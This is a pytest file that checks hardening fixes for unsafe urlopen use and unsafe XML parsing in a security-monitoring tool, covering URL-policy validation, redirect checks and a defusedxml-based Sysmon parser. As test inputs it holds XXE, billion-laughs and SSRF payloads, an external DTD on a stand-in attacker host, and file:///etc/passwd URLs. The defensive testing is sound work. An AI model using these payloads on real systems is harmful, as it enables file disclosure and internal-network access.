"""tests/test_url_and_xml_v69_m617.py — V69 M61.7: untrusted URLs and untrusted XML.

Two Bandit families, one shared mistake: a stdlib convenience function was handed
attacker-or-config-reachable input and trusted to do the safe thing.

**B310 (4 findings)** — the Ollama probe and chat call in ``core/ai_reverser.py``, the
Ollama probe in ``core/health_watchdog.py`` and the NAC quarantine webhook in
``core/network_quarantine.py`` passed a configuration-derived URL to
``urllib.request.urlopen``. ``urlopen`` is not an HTTP function: its default opener also
serves ``file:``, ``ftp:`` and ``data:``. A ``file:///`` value in a ``.env`` or a stale
deployment config makes the health probe report a successfully-read local file as
"ollama responsive", makes the chat call parse a local file as a model answer, and makes
network *containment* report success while the host stays on the network. Validating the
initial URL is also not sufficient on its own: stdlib ``HTTPRedirectHandler`` follows a
302 into ``http``, ``https`` **and ``ftp``**.

**B314 (1 finding)** — ``tools/sysmon_bridge.py`` parsed Sysmon event XML with
``xml.etree.ElementTree.fromstring``. That log is written by a monitored VM and describes
an attacker's own activity, so it is untrusted by construction; ElementTree resolves DTDs
and entities, giving billion-laughs memory exhaustion and XXE file disclosure into a
broadcast HUD event.

Both are fixed structurally: no ``urlopen`` call remains in the tree, and the XML parser
is ``defusedxml`` with fail-closed absence handling.
"""
from __future__ import annotations

import ast
import urllib.error
import urllib.request
from pathlib import Path

import pytest

from core import url_policy
from core.url_policy import UrlPolicyError, validate_url

_APP_ROOT = Path(__file__).resolve().parent.parent


# ── B310: scheme, credential and destination validation ─────────────────────
@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "file://C:/Windows/win.ini",
        "ftp://example.com/payload",
        "gopher://example.com/1",
        "data:text/plain;base64,aGk=",
        "jar:file:///tmp/x!/y",
        "netdoc:///etc/passwd",
        "ldap://example.com/x",
        "custom-scheme://whatever",
    ],
)
def test_non_http_schemes_are_refused(url: str):
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url(url)
    assert "not permitted" in str(excinfo.value) or "no scheme" in str(excinfo.value)


@pytest.mark.parametrize(
    "url",
    ["//evil.example/api", "evil.example/api", "localhost:11434/api/tags", "/api/tags"],
)
def test_scheme_relative_and_bare_urls_are_refused(url: str):
    """A scheme-relative URL inherits a scheme this code never chose."""
    with pytest.raises(UrlPolicyError):
        validate_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "http://user:pass@host/api",
        "https://user:pass@host/api",
        "http://user@host/api",
        "HTTP://admin:secret@10.0.0.1/api",
    ],
)
def test_embedded_credentials_are_refused(url: str):
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url(url)
    assert "credentials" in str(excinfo.value)


def test_credential_rejection_does_not_echo_the_password():
    """The error is read by an operator and may be logged; it must not leak the secret."""
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url("http://admin:sup3rs3cret@10.0.0.1/api")
    assert "sup3rs3cret" not in str(excinfo.value)


@pytest.mark.parametrize("url", ["http://host:99999/x", "http://host:0/x", "http://host:abc/x"])
def test_invalid_ports_are_refused(url: str):
    with pytest.raises(UrlPolicyError):
        validate_url(url)


def test_fragments_are_refused_for_api_endpoints():
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url("http://localhost:11434/api/tags#section")
    assert "fragment" in str(excinfo.value)


@pytest.mark.parametrize("url", ["", "   ", None, 12345])
def test_empty_and_non_string_urls_are_refused(url):
    with pytest.raises(UrlPolicyError):
        validate_url(url)


def test_valid_http_and_https_urls_pass():
    """Fail-closed must not mean fail-always."""
    assert validate_url("http://localhost:11434/api/tags") == "http://localhost:11434/api/tags"
    assert validate_url("https://nac.example.com/hook") == "https://nac.example.com/hook"
    assert validate_url("http://10.0.0.5:8080/a?b=c") == "http://10.0.0.5:8080/a?b=c"


def test_scheme_comparison_is_case_insensitive():
    assert validate_url("HTTPS://example.com/x").startswith("https://")


# ── B310: the Ollama destination restriction ────────────────────────────────
@pytest.mark.parametrize(
    "url",
    [
        "http://localhost:11434/api/tags",
        "http://127.0.0.1:11434/api/chat",
        "http://[::1]:11434/api/tags",
        "http://192.168.1.50:11434/api/tags",
        "http://10.10.0.5:11434/api/tags",
    ],
)
def test_loopback_and_private_ollama_endpoints_are_allowed(url: str):
    assert validate_url(url, require_local=True)


@pytest.mark.parametrize("url", ["http://8.8.8.8:11434/api/tags", "https://1.1.1.1/api/tags"])
def test_public_ollama_endpoints_are_refused(url: str):
    """An "Ollama" on the public internet is either a mistake or an exfiltration path."""
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url(url, require_local=True)
    assert "non-local" in str(excinfo.value)


def test_a_hostname_aliased_to_a_public_ip_is_refused(monkeypatch):
    """DNS rebinding: the NAME looks local, every resolved ADDRESS is what matters."""
    monkeypatch.setattr(
        url_policy.socket,
        "getaddrinfo",
        lambda host, port: [(2, 1, 6, "", ("93.184.216.34", 0))],
    )
    with pytest.raises(UrlPolicyError):
        validate_url("http://ollama.internal:11434/api/tags", require_local=True)


def test_a_host_resolving_to_both_local_and_public_is_refused(monkeypatch):
    """ANY public address disqualifies the host — not "at least one is local"."""
    monkeypatch.setattr(
        url_policy.socket,
        "getaddrinfo",
        lambda host, port: [
            (2, 1, 6, "", ("127.0.0.1", 0)),
            (2, 1, 6, "", ("93.184.216.34", 0)),
        ],
    )
    with pytest.raises(UrlPolicyError):
        validate_url("http://split.internal:11434/api/tags", require_local=True)


def test_an_unresolvable_host_is_refused_not_assumed_local(monkeypatch):
    def _boom(host, port):
        raise OSError("no such host")

    monkeypatch.setattr(url_policy.socket, "getaddrinfo", _boom)
    with pytest.raises(UrlPolicyError) as excinfo:
        validate_url("http://nope.invalid:11434/x", require_local=True)
    assert "could not be resolved" in str(excinfo.value)


def test_the_nac_webhook_is_deliberately_not_pinned_to_local():
    """A NAC appliance or SaaS controller is legitimately remote."""
    assert validate_url("https://nac.vendor.example/quarantine")


# ── B310: redirects are re-validated, and the opener has no file/ftp handler ─
def test_a_redirect_to_a_disallowed_scheme_is_refused():
    handler = url_policy._ValidatingRedirectHandler(require_local=False, label="probe")
    request = urllib.request.Request("http://example.com/start")
    for hostile in ("file:///etc/passwd", "ftp://evil.example/x", "gopher://evil/1"):
        with pytest.raises(urllib.error.HTTPError) as excinfo:
            handler.redirect_request(request, None, 302, "Found", {}, hostile)
        assert "refused redirect" in str(excinfo.value)


def test_a_redirect_off_the_local_network_is_refused_for_ollama():
    handler = url_policy._ValidatingRedirectHandler(require_local=True, label="ollama")
    request = urllib.request.Request("http://127.0.0.1:11434/api/tags")
    with pytest.raises(urllib.error.HTTPError):
        handler.redirect_request(request, None, 302, "Found", {}, "http://8.8.8.8/x")


def test_a_redirect_to_an_allowed_destination_still_works():
    handler = url_policy._ValidatingRedirectHandler(require_local=True, label="ollama")
    request = urllib.request.Request("http://127.0.0.1:11434/api/tags")
    result = handler.redirect_request(
        request, None, 302, "Found", {}, "http://127.0.0.1:11434/api/tags2"
    )
    assert result is not None


def test_the_opener_has_no_file_ftp_or_data_handler():
    """Defence in depth: even if validation were bypassed, nothing can serve file:."""
    opener = url_policy._build_opener(require_local=False, label="probe")
    installed = {type(h).__name__ for h in opener.handlers}
    for forbidden in ("FileHandler", "FTPHandler", "CacheFTPHandler", "DataHandler"):
        assert forbidden not in installed, f"{forbidden} is installed"
    assert "HTTPHandler" in installed and "HTTPSHandler" in installed


def test_a_request_object_cannot_bypass_validation():
    """Wrapping a hostile URL in a Request must not skip the policy."""
    request = urllib.request.Request("file:///etc/passwd")
    with pytest.raises(UrlPolicyError):
        url_policy.open_url(request, timeout=1)


# ── B310: no urlopen survives anywhere ──────────────────────────────────────
def test_no_urlopen_call_remains_in_core_or_tools():
    """The finding is removed structurally, not suppressed."""
    offenders: list[str] = []
    for directory in ("core", "tools"):
        for path in sorted((_APP_ROOT / directory).rglob("*.py")):
            try:
                tree = ast.parse(path.read_text(encoding="utf-8"))
            except (SyntaxError, UnicodeDecodeError):  # pragma: no cover
                continue
            for node in ast.walk(tree):
                if not (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)):
                    continue
                if node.func.attr in {"urlopen", "urlretrieve"}:
                    offenders.append(f"{directory}/{path.name}:{node.lineno}")
    # core/security_analyzer.py mentions "urlopen" as a DETECTION STRING, not a call.
    assert offenders == [], f"unvalidated URL opens remain: {offenders}"


@pytest.mark.parametrize(
    "relative_path",
    ["core/ai_reverser.py", "core/health_watchdog.py", "core/network_quarantine.py"],
)
def test_every_former_b310_site_now_routes_through_the_policy(relative_path: str):
    source = (_APP_ROOT / relative_path).read_text(encoding="utf-8")
    assert "open_url(" in source
    assert "url_policy" in source


def test_the_ollama_sites_require_a_local_destination():
    """The Ollama-specific half of the policy must actually be requested."""
    for relative_path in ("core/ai_reverser.py", "core/health_watchdog.py"):
        source = (_APP_ROOT / relative_path).read_text(encoding="utf-8")
        assert "require_local=True" in source, relative_path


# ── B314: hardened XML ──────────────────────────────────────────────────────
def _sysmon_event(event_id: int = 1) -> str:
    ns = "http://schemas.microsoft.com/win/2004/08/events/event"
    return (
        f'<Event xmlns="{ns}"><System><EventID>{event_id}</EventID></System>'
        f'<EventData><Data Name="ProcessId">4242</Data>'
        f'<Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>'
        f'<Data Name="CommandLine">cmd /c whoami</Data>'
        f'<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>'
        f"</EventData></Event>"
    )


def _run(coro):
    import asyncio

    return asyncio.run(coro)


def test_a_normal_sysmon_event_still_parses():
    from tools import sysmon_bridge

    events: list[dict] = []

    async def _broadcast(event):
        events.append(event)

    _run(sysmon_bridge._parse_event(_sysmon_event(1), _broadcast))
    assert len(events) == 1
    assert events[0]["event_id"] == 1
    assert events[0]["pid"] == 4242
    assert "cmd.exe" in events[0]["process"]


def test_a_non_sensitive_event_id_is_dropped():
    from tools import sysmon_bridge

    events: list[dict] = []

    async def _broadcast(event):
        events.append(event)

    _run(sysmon_bridge._parse_event(_sysmon_event(4624), _broadcast))
    assert events == []


@pytest.mark.parametrize(
    "payload",
    [
        # billion laughs — entity expansion
        '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;">]>'
        "<Event><System><EventID>&lol2;</EventID></System></Event>",
        # XXE — external entity, local file
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<Event><System><EventID>&xxe;</EventID></System></Event>",
        # XXE — external entity over the network (SSRF via the parser)
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
        "<Event><System><EventID>&xxe;</EventID></System></Event>",
        # external DTD reference
        '<!DOCTYPE r SYSTEM "http://evil.example/evil.dtd"><Event/>',
        # parameter entity
        '<!DOCTYPE r [<!ENTITY % pe SYSTEM "file:///etc/passwd">%pe;]><Event/>',
    ],
)
def test_xml_attack_payloads_are_refused(payload: str):
    from tools import sysmon_bridge

    events: list[dict] = []

    async def _broadcast(event):
        events.append(event)

    _run(sysmon_bridge._parse_event(payload, _broadcast))
    assert events == [], "a parser attack must not produce a broadcast event"


def test_malformed_xml_fails_safely():
    from tools import sysmon_bridge

    events: list[dict] = []

    async def _broadcast(event):
        events.append(event)

    for payload in ("<Event><System><EventID>1", "not xml at all", "<Event/>", ""):
        _run(sysmon_bridge._parse_event(payload, _broadcast))
    assert events == []


def test_an_oversized_event_is_dropped_before_parsing():
    from tools import sysmon_bridge

    events: list[dict] = []

    async def _broadcast(event):
        events.append(event)

    oversized = "<Event>" + ("A" * (sysmon_bridge.MAX_EVENT_CHARS + 1)) + "</Event>"
    _run(sysmon_bridge._parse_event(oversized, _broadcast))
    assert events == []


def test_a_hostile_payload_is_never_written_to_the_log(caplog):
    """A refusal must not copy the attack into the log or a diagnostics bundle."""
    from tools import sysmon_bridge

    marker = "MARKER_SECRET_CANARY_VALUE"
    payload = (
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///{marker}">]>'
        "<Event><System><EventID>&xxe;</EventID></System></Event>"
    )

    async def _broadcast(event):  # pragma: no cover — must not be reached
        raise AssertionError("hostile event was broadcast")

    with caplog.at_level("DEBUG"):
        _run(sysmon_bridge._parse_event(payload, _broadcast))
    assert marker not in caplog.text
    assert marker not in "".join(record.getMessage() for record in caplog.records)


def test_defusedxml_is_the_parser_and_there_is_no_elementtree_fallback():
    """A fallback would remove the protection in exactly the environment lacking it."""
    source = (_APP_ROOT / "tools" / "sysmon_bridge.py").read_text(encoding="utf-8")
    assert "from defusedxml.ElementTree import fromstring" in source
    assert "import xml.etree.ElementTree" not in source
    tree = ast.parse(source)
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                assert not alias.name.startswith("xml.etree"), "stdlib XML fallback present"
        if isinstance(node, ast.ImportFrom) and (node.module or "").startswith("xml.etree"):
            pytest.fail("stdlib XML fallback present")


def test_absence_of_defusedxml_is_fail_closed(monkeypatch):
    from tools import sysmon_bridge

    monkeypatch.setattr(sysmon_bridge, "_XML_HARDENED", False)
    events: list[dict] = []

    async def _broadcast(event):  # pragma: no cover
        events.append(event)

    _run(sysmon_bridge._parse_event(_sysmon_event(1), _broadcast))
    assert events == [], "without defusedxml the bridge must parse nothing"


def test_defusedxml_is_declared_in_the_dependency_authority():
    soc = (_APP_ROOT / "requirements" / "soc.txt").read_text(encoding="utf-8")
    assert "defusedxml" in soc
    pyproject = (_APP_ROOT / "pyproject.toml").read_text(encoding="utf-8")
    assert "defusedxml" in pyproject


def test_the_reassembly_buffer_is_bounded():
    """An unterminated "<Event " grew the buffer by 4 KB/s forever."""
    from tools import sysmon_bridge

    assert sysmon_bridge.MAX_BUFFER_CHARS > sysmon_bridge.MAX_EVENT_CHARS > 0
    source = (_APP_ROOT / "tools" / "sysmon_bridge.py").read_text(encoding="utf-8")
    assert "MAX_BUFFER_CHARS" in source
    assert "len(buffer) > MAX_BUFFER_CHARS" in source
